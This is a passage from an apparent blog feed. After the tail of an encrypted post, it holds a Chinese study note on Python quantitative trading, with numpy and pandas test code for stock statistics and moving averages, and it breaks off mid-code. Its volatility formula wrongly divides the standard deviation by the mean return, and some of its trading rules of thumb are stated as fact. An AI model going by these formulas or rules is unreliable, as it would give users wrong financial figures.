1ba16ecf7a87f47bd9f8343cd79057e59cd741ca2ed976ebcb3b771f54bcc1e3ebeebc31d921adf6a03f06bd446702ebb616d34d94ad15d3f0aae08db44727442cede14ea8df465e0f809eb2d463759f6634fb3b27a9c7423bb9896f0ce72d7202e5a5bef33837d40ec606c57e223ebf44bb523e2501be2dcc59d5f5df26f7a949a85b9772e148b122c126eb5bff56fc1a6fa2a8c0215b51b67cbb4841806771aecef4dd138ea8d83a48131746852b2717949f99c72f6f350f30d6566bff48841b1e0d3460627675272d03f5757088e2856487210e81d015e3ad50d76a6b446d29a313a01009be1873c62271e4f9c60de7325d7d0b21768a48405d8f929cbe2a9d2373adfd5ad8bdf5cd24adafd19ff3a41d4bdf70d5da528f581927cb90055a4dace46d8c85442dd6ed4134830a4d922de0fde387ba52197d6e7802c3135d0ba93f39fd33452a01ca618f501df811f48f6dc4a6477e1c0bb9f6b2b89bc822b6812a24b908b041f217c1f076e1c044f874610952b830959e1d6644c9ce27edd016ee31d69089d16b545a782adbbb6fee088521ba95288396ad1ad6d1a34f41662f06d77bbfe9d235d0fd17da8343c2a20933cb4468d13389f2670c4864ffe7b6560d8678bff2366fe43184379e977e0480320a875366ca</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>python量化交易</title>
    <url>/2025/07/04/python%E9%87%8F%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="量化交易初识"><a href="#量化交易初识" class="headerlink" title="量化交易初识"></a>量化交易初识</h1><p><img data-src="/../images/image-20250704174239159.png" alt="image-20250704174239159"></p>
<p>量化交易分类：</p>
<p>策略信号：</p>
<ul>
<li>多因子策略</li>
<li>均值回归策略</li>
<li>动量效益策略</li>
<li>二八轮动策略</li>
<li>海归策略</li>
<li>机器学习策略</li>
</ul>
<h1 id="量化交易开发流程"><a href="#量化交易开发流程" class="headerlink" title="量化交易开发流程"></a>量化交易开发流程</h1><ol>
<li>数据获取</li>
<li>数据清洗</li>
<li>策略编写（核心）</li>
<li>策略回测</li>
<li>策略优化（重点）</li>
<li>模拟盘交易</li>
<li>实盘交易（真金白银）</li>
</ol>
<p><strong>数据获取</strong></p>
<p>内容：行情数据、宏观数据、财务数据、舆情数据</p>
<p>方式：网站下载、客户端、三方api、爬虫</p>
<p><strong>数据清洗</strong></p>
<p>场景：垃圾数据清除、空值填充、格式转换、数据对齐</p>
<p>类库：numpy、pandas</p>
<p><strong>策略编写</strong></p>
<p>建仓：买；平仓：卖；策略要判断出交易信号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A[信号捕捉] --&gt; B[交易];</span><br><span class="line">    B --&gt; C[建仓];</span><br><span class="line">    B --&gt; D[平仓];</span><br></pre></td></tr></table></figure>

<p><strong>策略回测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">    A[回测参数设置] --&gt; B[策略实例化];</span><br><span class="line">    B --&gt; C[历史数据加载];</span><br><span class="line">    C --&gt; D[回测执行];</span><br><span class="line">    D --&gt; E[计算统计指标];</span><br><span class="line">    E --&gt; F[生成回测报告];</span><br></pre></td></tr></table></figure>

<p><strong>量化策略优化</strong></p>
<ul>
<li>重视交易费</li>
<li>重视风险，重视退出（止盈线、止损线）</li>
<li>优化无止境（不要无休止得）</li>
</ul>
<p><strong>模拟盘交易</strong></p>
<ul>
<li>过去的表现并不表示未来结果（事后诸葛亮）</li>
<li>至少半年以上</li>
<li>模拟盘交易稳定收益100%以上在考虑实盘交易</li>
</ul>
<p><strong>实盘交易</strong></p>
<ul>
<li>做好第一年会输的准备</li>
<li>不要急于扩大投资，增加杠杆（控制风险）</li>
<li>心态最重要</li>
</ul>
<h2 id="量化交易分类体系"><a href="#量化交易分类体系" class="headerlink" title="量化交易分类体系"></a>量化交易分类体系</h2><h3 id="交易产品分类"><a href="#交易产品分类" class="headerlink" title="交易产品分类"></a>交易产品分类</h3><p>交易产品、盈利模式</p>
<ul>
<li>股票策略，股票——股价波动盈利</li>
<li>期权策略，期权——期权合约差价（常用）、到期行权收益</li>
<li>CTA策略，期货——关注价格趋势获取利差</li>
<li>FOF策略，FOF</li>
</ul>
<h3 id="盈利模式分类"><a href="#盈利模式分类" class="headerlink" title="盈利模式分类"></a>盈利模式分类</h3><ul>
<li>单边多空策略——<strong>低价买</strong>进，带股价出现单边下跌时卖出，赚取利差</li>
<li>套利策略——<strong>金融产品价格与收益略暂时不一致</strong>的机会收益</li>
<li>对冲策略——指特以减低另一项投资风险的<strong>投资</strong>。同时进行两笔<strong>行情相同、方向相关、数量相当、盈亏相抵</strong>的交易</li>
</ul>
<h3 id="策略信号分类"><a href="#策略信号分类" class="headerlink" title="策略信号分类"></a>策略信号分类</h3><p>策略信号就是交易信号</p>
<ul>
<li>多因子——找到某些和收益率最相关的指标，并根据该指标，建一个股票组合，期望该组合在未来的一段时间跑赢（做多）或跑输（做空）指数</li>
</ul>
<p>例：因子项：资产负债率、资产回报率、每股净收益、净利润增长率、市盈率等</p>
<ul>
<li>交易模型——具有普遍性、可盈利可量化可执行的交易系统</li>
<li>机器学习——从大规模数据中找到某种规律，包括但不限于文本数据、<strong>图像数据</strong>等，找到可盈利、可量化、可执行的策略信号。</li>
</ul>
<h1 id="股票"><a href="#股票" class="headerlink" title="股票"></a>股票</h1><p>股票的<strong>交易价格</strong>与股票的<strong>价值</strong>是相对的概念。股票价值的真实含义是<strong>企业资产的价值</strong>。而股票的价值就等于<strong>每股收益</strong>。</p>
<p>影响因素：</p>
<ul>
<li>经济因素——经济繁荣，股价上涨；经济衰退，股价下跌</li>
<li>政治因素</li>
<li>行业因素</li>
<li>企业自身因素</li>
<li>市场因素</li>
<li>心理因素</li>
</ul>
<p>股票的基础知识：自己拿真金白银才能在股市中试出来，通过各种指标读懂散户与主力的情绪、市场和其中的博弈。</p>
<h2 id="量化选股"><a href="#量化选股" class="headerlink" title="量化选股"></a>量化选股</h2><p>选股是股票投资的第一步，选好赚钱选坏亏钱</p>
<p>方法：基本面选股</p>
<p>基本面：通过分析一家上市公司在发展过程中所面临的<strong>外部因素</strong>及<strong>自身的因素</strong>，来预测其未来的发展前景，并以此来判断该上市公司的股票是否值得购买。</p>
<p>外部因素：经济增长、财政策略、利率变化（贷款等）</p>
<p>内部因素：经营状况、行业地位、财务状况</p>
<p>科学的分析方法：估值</p>
<p><strong>股票估值</strong>基本面选股的<strong>核心方法</strong>。股票估值能够帮助投资者发现价值被低估的股票，让他们低买高卖，从而获利。</p>
<p>常用指标：</p>
<ul>
<li><strong>每股收益</strong>：<strong>越高越好</strong>，代表公司盈利水平</li>
<li><strong>市盈率</strong>：14~30倍正常，大于30属于高估，50倍以上存在泡沫</li>
<li><strong>毛利率</strong>：越高越好，大于50%不错</li>
<li><strong>净资产收益率</strong>：代表公司盈利能力，<strong>ROE长期保持在20%以上就是白马股</strong></li>
<li><strong>资产负债率</strong>：适中为好，最好在<strong>10%~40%</strong>。过高，易暴雷；过低，太保守</li>
<li><strong>净利润增速</strong>：代表公司未来成长能力，近三年20以上属优质企业，大于50%属于<strong>成长股</strong></li>
</ul>
<h2 id="择时"><a href="#择时" class="headerlink" title="择时"></a>择时</h2><p>即<strong>买入股票</strong>和<strong>卖出股票</strong>的时机</p>
<p>作用：择时的好坏，决定能够<strong>赚到多少钱</strong></p>
<p>方法：技术分析——K线、成交量、均线、柏林带、MACD、KDJ等<strong>反应股价变化</strong>的指标</p>
<h2 id="量化交易平台"><a href="#量化交易平台" class="headerlink" title="量化交易平台"></a>量化交易平台</h2><p>joinQuant、掘金量化、BigQuant、RiceQuant等</p>
<h1 id="Numpy实战"><a href="#Numpy实战" class="headerlink" title="Numpy实战"></a>Numpy实战</h1><h2 id="股价分析"><a href="#股价分析" class="headerlink" title="股价分析"></a>股价分析</h2><p><strong>一些指标</strong></p>
<p>极差：股价近期最高价的最大值和最小值的插值，</p>
<p>成交量加权平均价格</p>
<p>收益率：简单收益率；对数收益率——之所有价格取对数后两两之间的差值</p>
<p>波动率：波动率：是对价格变动的一种衡量，计算历史波动率需要用到对数收益率</p>
<p>年波动率：对数波动率的标准差除以其均值，再乘以交易日倒数的平方根，通常为250</p>
<p>月波动率：对数收益率的标准差除以其均值，再乘以交易月的平方根，通常为12</p>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestNumpyStock</span>(unittest.TestCase):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取指定列</span></span><br><span class="line"><span class="string">    numpy.loadtxt需要传入4个关键字参数：</span></span><br><span class="line"><span class="string">    1.fname是文件名，数据类型为字符串str；</span></span><br><span class="line"><span class="string">    2.delimiter是分隔符，数据类型为字符串str；</span></span><br><span class="line"><span class="string">    3.usecols是读取的列数，数据类型为元组tuple，其中元素个数有多少个，则选出多少列；</span></span><br><span class="line"><span class="string">    4.unpack是是否解包，数据类型为布尔bool。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testReadFile</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        <span class="comment"># 读取股票代码、日期、开盘价、最高价、最低价、收盘价和成交量</span></span><br><span class="line">        end_price,volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>,<span class="number">6</span>),</span><br><span class="line">            unpack=<span class="literal">True</span>,</span><br><span class="line">            <span class="comment"># dtype=str,</span></span><br><span class="line">            skiprows=<span class="number">1</span>  <span class="comment"># 跳过标题行</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># print(end_price)</span></span><br><span class="line">        <span class="comment"># print(volumn)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算最大值与最小值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMaxAndMin</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        <span class="comment"># 读取最高价和最低价(从第5列开始，索引为4和5)</span></span><br><span class="line">        high_price,low_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">            <span class="comment">#dtype=float,</span></span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max_price = <span class="subst">&#123;high_price.<span class="built_in">max</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;min_price = <span class="subst">&#123;low_price.<span class="built_in">min</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算极差</span></span><br><span class="line">    <span class="comment"># 计算股价近期最高价的最大值和最小值的差值 和 计算股价近期最低价的最大值和最小值的差值</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testPtp</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        high_price, low_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">3</span>, <span class="number">4</span>),</span><br><span class="line">            dtype=<span class="built_in">float</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,  <span class="comment"># 跳过标题行</span></span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max - min of high_price = <span class="subst">&#123;np.ptp(high_price)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;max - min of low_price = <span class="subst">&#123;np.ptp(low_price)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算成交量加权平均价格</span></span><br><span class="line">    <span class="comment"># 成交量加权平均价格: 英文名VWAP(Volume-Weighted Average Price，成交量加权平均价格)</span></span><br><span class="line">    <span class="comment"># 是一个非常重要的经济学指标，代表着金融资产的&quot;平均&quot;价格</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testAVG</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volume = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),  <span class="comment"># 2: 收盘价(open), 6: 成交量(vol)</span></span><br><span class="line">            dtype=<span class="built_in">float</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;vg_price = <span class="subst">&#123;np.average(end_price)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;VWAD = <span class="subst">&#123;np.average(end_price,weights=volume)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算中位数</span></span><br><span class="line">    <span class="comment">#收盘价的中位数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testMedian</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;median = <span class="subst">&#123;np.median(end_price)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算方差</span></span><br><span class="line">    <span class="comment">#收盘价的方差</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testVar</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;var = <span class="subst">&#123;np.var(end_price)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算股票收益率、年波动率及月波动率</span></span><br><span class="line">    <span class="comment">#收益率：简单收益率；对数收益率——之所有价格取对数后两两之间的差值</span></span><br><span class="line">    <span class="comment">#波动率：是对价格变动的一种衡量，计算历史波动率需要用到对数收益率</span></span><br><span class="line">    <span class="comment">#年波动率：对数波动率的标准差除以其均值，再乘以交易日倒数的平方根，通常为250</span></span><br><span class="line">    <span class="comment">#月波动率：对数收益率的标准差除以其均值，再乘以交易月的平方根，通常为12</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testVolatility</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price, volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>, <span class="number">6</span>),</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#对数收益率</span></span><br><span class="line">        log_return = np.diff(np.log(end_price))</span><br><span class="line">        <span class="comment">#年度波动率</span></span><br><span class="line">        annual_volatility = log_return.std() / log_return.mean() * np.sqrt(<span class="number">250</span>)</span><br><span class="line">        <span class="comment">#月度波动率</span></span><br><span class="line">        monthly_volatility = log_return.std() / log_return.mean() * np.sqrt(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;log_return = <span class="subst">&#123;log_return&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;annual_volatility = <span class="subst">&#123;annual_volatility&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;monthly_volatility = <span class="subst">&#123;monthly_volatility&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>

<h2 id="股价均线"><a href="#股价均线" class="headerlink" title="股价均线"></a>股价均线</h2><p>卷积：可用于描述过去左右对当前的影响。<strong>卷积是时空相应的叠加，可用作计算“滑动平均”</strong></p>
<p>numpy.convolve(a, v, mode&#x3D;’full’)，这是numpy函数中的卷积函数。</p>
<p>参数：</p>
<ul>
<li><p><strong>a</strong>: <code>(N,)</code> 输入的一维数组</p>
</li>
<li><p><strong>b</strong>: <code>(M,)</code> 输入的第三个一维数组</p>
</li>
<li><p><strong>mode</strong>: <code>&#123;‘full’, ‘valid’, ‘same’&#125;</code> 参量可选</p>
<ul>
<li><p><strong>‘full’</strong>: 默认值，返回每一个卷积值，长度是 N + M - 1，在卷积的边缘处，信号不重量，存在边际效应。</p>
</li>
<li><p><strong>‘same’</strong>: 返回的数组长度为 max(M, N)，即原有效应存在。</p>
</li>
<li><p><strong>‘valid’</strong>: 返回的数组长度为 max(M, N) - min(M, N) + 1，此时返回的是完全重量的点，边缘的点无效。</p>
</li>
</ul>
</li>
</ul>
<p><strong>简单移动均线</strong>：一般用于分析时间序列上的股价趋势   计算股价与权重的指标函数的卷积。通过将一段时间内的股票收盘价相加，然后除以时间段的天数来计算。简单移动平均线可以平滑价格波动，显示出长期趋势。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[生成权重] --&gt; B[卷积运算]</span><br><span class="line">    B --&gt; C[均线可视化]</span><br></pre></td></tr></table></figure>

<p><strong>指标移动均线</strong>：历史数据的<strong>权重</strong>以<strong>指标速度衰减</strong>，计算股价与权重衰减的指标函数的卷积。对近期价格给予更高的权重，反映了市场更近期的变化。计算指数移动平均线时，当前价格会根据选定的时间段和权重系数，与之前的移动平均线值相结合。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[权重初始化] --&gt; B[权重衰减]</span><br><span class="line">    B --&gt; C[卷积运算]</span><br><span class="line">    C --&gt; D[均线可视化]</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong>：</p>
<ul>
<li><strong>确定趋势</strong>：投资者可以使用不同期限的移动平均线来确定趋势的强度和方向。</li>
<li><strong>交叉信号</strong>：移动平均线的交叉可以提供买入或卖出的信号。</li>
<li><strong>支撑与阻力线</strong>：移动平均线经常被用作支撑和阻力线的参考。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestNumpyMA</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 简单移动均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testSMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&quot;,&quot;</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>),</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(end_price)</span><br><span class="line">        <span class="comment"># 这里为什么这么算</span></span><br><span class="line">        N=<span class="number">5</span></span><br><span class="line">        weights = np.ones(N) / N</span><br><span class="line">        <span class="built_in">print</span>(weights)</span><br><span class="line"></span><br><span class="line">        sma = np.convolve(weights,end_price)[N-<span class="number">1</span>:-N+<span class="number">1</span>] <span class="comment">#从N-1到-(N-1)</span></span><br><span class="line">        <span class="built_in">print</span>(sma) <span class="comment"># 5日均线</span></span><br><span class="line"></span><br><span class="line">        plt.plot(sma,linewidth=<span class="number">5</span>)</span><br><span class="line">        <span class="comment">#plt.show()</span></span><br><span class="line">        <span class="comment"># plt.draw()</span></span><br><span class="line">        <span class="comment"># plt.pause()  # 短暂暂停确保绘图完成</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卷积</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testEXP</span>(<span class="params">self</span>):</span><br><span class="line">        x = np.arange(<span class="number">5</span>)</span><br><span class="line">        y = np.arange(<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x&quot;</span>,x) <span class="comment"># exp 函数可以计算出每个数组元素的指数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;y&quot;</span>,y)</span><br><span class="line">        <span class="comment"># 指数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;Exp x : <span class="subst">&#123;np.exp(x)&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;Exp y : <span class="subst">&#123;np.exp(y)&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># 线性衰减</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;LineSpace : <span class="subst">&#123;np.linspace(-<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>)&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 指数移动均线</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testEMA</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        end_price,volumn = np.loadtxt(</span><br><span class="line">            fname=file_name,</span><br><span class="line">            delimiter=<span class="string">&quot;,&quot;</span>,</span><br><span class="line">            skiprows=<span class="number">1</span>,</span><br><span class="line">            usecols=(<span class="number">5</span>,<span class="number">6</span>),</span><br><span class="line">            unpack=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(end_price)</span><br><span class="line">        N = <span class="number">5</span></span><br><span class="line">        weighs = np.exp(np.linspace(-<span class="number">1</span>,<span class="number">0</span>,N))</span><br><span class="line">        weighs /= weighs.<span class="built_in">sum</span>() <span class="comment">#weighs.sum()</span></span><br><span class="line">        <span class="built_in">print</span>(weighs)</span><br><span class="line">        ema = np.convolve(weighs,end_price)[N-<span class="number">1</span>:-N+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(ema)</span><br><span class="line"></span><br><span class="line">        t = np.arange(N-<span class="number">1</span>,<span class="built_in">len</span>(end_price))</span><br><span class="line">        plt.plot(t,end_price[N-<span class="number">1</span>:],lw=<span class="number">1.0</span>)</span><br><span class="line">        plt.plot(t,ema,lw=<span class="number">2.0</span>)</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;++++++++=============++++++++&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>

<h1 id="Pandas实战"><a href="#Pandas实战" class="headerlink" title="Pandas实战"></a>Pandas实战</h1><h2 id="股票时间序列"><a href="#股票时间序列" class="headerlink" title="股票时间序列"></a>股票时间序列</h2><p><strong>时间序列</strong>：金融领域最重要的数据类型之一，股价、汇率为常见的时间序列数据</p>
<p><strong>趋势分析</strong>：**主要分析时间序列在某一方向上持续运动。**在量化交易领域，我们通过统计手段对投资品的收益率进行时间序列建模，以此来预测未来的收益率并产生交易信号。</p>
<p><strong>序列相关性</strong>：金融时间序列的一个最重要特征是序列相关性。  以投资品的收益率序列为例，我们会经常观察到一段时间内的收益率呈现一定的相关性。</p>
<p><strong>pandas时间序列函数：</strong></p>
<ul>
<li>datetime——时间序列最常用的数据类型，方便进行各种时间类型运算</li>
<li>loc——Pandas中对DataFrame进行筛选的函数，相当于SQL中的where</li>
<li>groupby——Pandas中对数据分组函数，相当于SQL中的GroupBy</li>
</ul>
<p>code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestPandasStock</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="comment">#读取文件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testPandasFile</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df.info())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-----------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(df.describe())</span><br><span class="line"></span><br><span class="line">    <span class="comment">#时间处理</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testTime</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;vol&#x27;</span>]</span><br><span class="line">        <span class="comment">#单独处理时间类型</span></span><br><span class="line">        df[<span class="string">&#x27;trade_date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;trade_date&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        df[<span class="string">&quot;year&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.year</span><br><span class="line">        df[<span class="string">&quot;month&quot;</span>] = df[<span class="string">&quot;trade_date&quot;</span>].dt.month</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最低收盘价</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">testCloseMin</span>(<span class="params">self</span>):</span><br><span class="line">        file_name = <span class="string">&quot;./demo_tushare.csv&quot;</span></span><br><span class="line">        df = pd.read_csv(file_name)</span><br><span class="line">        df.columns = [<span class="string">&#x27;ts_code&#x27;</span>, <span class="string">&#x27;trade_date&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;high&#x27;</span>, <span class="string">&#x27;low&#x27;</span>, <span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;col&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min : <span class="subst">&#123;df[<span class="string">&#x27;close&#x27;</span>].<span class="built_in">min</span>()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min index : <span class="subst">&#123;df[<span class="string">&#x27;close&#x27;</span>].idxmin()&#125;</span>&quot;&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&quot;&quot;close min frame : <span class="subst">&#123;df.loc[df[<span 